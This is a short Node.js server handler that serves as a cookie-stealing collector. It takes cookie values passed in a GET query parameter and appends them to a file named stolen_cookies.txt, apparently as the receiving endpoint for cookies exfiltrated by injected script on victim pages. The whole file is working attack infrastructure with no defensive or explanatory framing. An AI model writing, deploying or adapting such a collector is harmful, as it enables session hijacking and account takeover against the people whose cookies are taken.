const fs = require('fs');
const path = require('path');

module.exports = (req, res) => {
    if (req.method === 'GET') {
        const cookies = req.query.cookies || 'No cookies';
        const logFile = path.join(__dirname, 'stolen_cookies.txt');

        // Append the cookies to the log file
        fs.appendFile(logFile, `${cookies}\n`, (err) => {
            if (err) {
                console.error('Error writing to file', err);
                res.status(500).send('Server Error');
            } else {
                res.status(200).send('Cookies logged successfully');
            }
        });
    } else {
        res.status(405).send('Method Not Allowed');
    }
}
